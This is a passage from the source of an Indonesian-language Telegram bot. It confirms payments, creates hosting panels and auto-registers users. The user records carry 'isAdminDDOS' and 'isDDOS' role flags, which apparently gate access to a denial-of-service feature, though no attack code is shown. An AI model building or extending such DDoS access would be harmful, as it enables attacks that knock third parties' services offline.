▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞
🎉 𝗧𝗲𝗿𝗶𝗺𝗮 𝗸𝗮𝘀𝗶𝗵 𝘁𝗲𝗹𝗮𝗵 𝗺𝗲𝗺𝗶𝗹𝗶𝗵 𝗹𝗮𝘆𝗮𝗻𝗮𝗻 𝗸𝗮𝗺𝗶!
💌 Support: ${settings.kontakCs} | 💻 Dev: ${settings.kontakCs}  

 `, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Login 🌐', url: `${domain}` }],
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                    [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            },
            parse_mode: "Markdown"
        });
                
                
              } else {
                bot.sendMessage(
                  chatId,
                  "Gagal membuat data panel. Silakan coba lagi."
                );
              }
            } catch (error) {
              console.error(error);
              await bot.sendMessage(
                chatId,
                `Terjadi kesalahan saat membuat panel\n${error}`
              );
            }
          }
         } catch (error) {
          console.error("Payment check error:", error);
        } 
      }, 3000);

      paymentIntervals.set(res.data.id, checkInterval);
    } catch (error) {
      console.error("Payment error:", error);
      await bot.sendMessage(chatId, "❌ Terjadi kesalahan sistem!");
    } finally {
      userPaymentMethods.delete(chatId);
      userUsernames.delete(chatId);
      userPackages.delete(chatId);
      orderType.delete(chatId); 
    }
  }
 

} 
  
});


// Auto-add user saat berinteraksi
bot.on('message', (msg) => {
    const userId = msg.from.id;
    const data = readData();
    
    if (!data[userId]) {
        data[userId] = {
            data: {
                isAdminReseller: false,
                isReseller: false,
                isAdminDDOS: false,
                isDDOS: false
            }
        };
        saveData(data);
        
    }
});


process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection:', reason);
});
} catch (error) {

  const botErrorMsg = [
    chalk.red.bold('╭─── ‼️ BOT ERROR ──────────────────────────'),
    `  ${chalk.red('Message: ')}`,
    `  ${error}`,
    chalk.red.bold('╰───────────────────────────────────────────╯')
  ].join('\n');
  
  console.error('\n' + botErrorMsg);
}



};